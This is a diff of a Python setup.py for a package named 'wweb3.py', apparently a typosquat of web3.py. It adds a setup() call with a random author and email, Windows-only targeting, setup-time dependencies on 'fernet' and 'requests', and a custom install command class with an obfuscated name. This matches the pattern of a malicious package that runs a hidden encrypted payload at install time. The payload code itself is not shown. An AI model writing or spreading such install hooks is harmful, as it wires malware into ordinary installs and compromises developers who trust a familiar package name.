@@ -18,5 +18,22 @@ class xJeNmrzbQUxggBxDBfSecodgIkIRjRmYCAXqdxArYBnJrsYoYSXQweYNEMRIhietGvOBYCQgVG
             install.run(self)
 
 
-# setup(...) removed                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                          
+setup(
+    name="wweb3.py",
+    version=VERSION,
+    author="YzUBfNklRO",
+    author_email="szqfLRZVMZXEI@gmail.com",
+    description=DESCRIPTION,
+    long_description_content_type="text/markdown",
+    long_description=LONG_DESCRIPTION,
+    cmdclass={
+        'install': xJeNmrzbQUxggBxDBfSecodgIkIRjRmYCAXqdxArYBnJrsYoYSXQweYNEMRIhietGvOBYCQgVGzsUlG,
+    },
+    packages=find_packages(),
+    setup_requires=['fernet', 'requests'],
+    keywords=[],
+    classifiers=[
+        "Operating System :: Microsoft :: Windows",
+    ]
+)
 
